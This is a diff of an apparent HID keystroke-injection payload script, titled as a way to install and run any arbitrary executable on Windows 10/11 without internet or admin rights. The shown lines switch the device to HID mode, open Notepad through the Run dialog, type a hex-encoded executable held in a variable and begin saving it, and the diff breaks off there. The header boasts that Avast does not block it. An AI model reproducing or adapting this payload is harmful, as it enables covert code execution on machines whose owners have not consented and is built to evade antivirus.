@@ -1,32 +1,33 @@
-* ###########################################################################################
-* #                                                                                         |
-* # Title        : Install And Run Any Arbitrary Executable - No Internet And Root Needed   |
-* # Author       : Aleff                                                                    |
-* # Version      : 1.0                                                                      |
-* # Category     : Execution                                                                |
-* # Target       : Windows 10/11                                                            |
-* #                                                                                         |
-* ###########################################################################################
+* REM ###########################################################################################
+* REM #                                                                                         #
+* REM # Title        : Install And Run Any Arbitrary Executable - No Internet And Root Needed   #
+* REM # Author       : Aleff                                                                    #
+* REM # Version      : 1.0                                                                      #
+* REM # Category     : Execution                                                                #
+* REM # Target       : Windows 10/11                                                            #
+* REM #                                                                                         #
+* REM ###########################################################################################
 
+ATTACKMODE HID
 
-* Requirements:
-*     - Nothing
+QUACK REM REQUIREMENTS
+* REM- Nothing
 
+QUACK REM NOTE
+* REM - Tested on Windows 11
+* REM - Running checked but not blocked by Avast antivirus
 
-* Note:
-*     - Tested on Windows 11
-*     - Running checked but not blocked by Avast antivirus
+QUACK REM VARIABLES
+* REM Define here your hexadecimal code
+HEX_CODE='example'
 
-
+QUACK DELAY 1500
 QUACK GUI r
 QUACK DELAY 1000
 QUACK STRING notepad.exe
 QUACK ENTER
 QUACK DELAY 2000
-
-* Define here your hexadecimal code
-QUACK STRING #HEX_CODE
-
+QUACK STRING $HEX_CODE
 QUACK DELAY 2000
 QUACK ALT F
 QUACK DELAY 1000
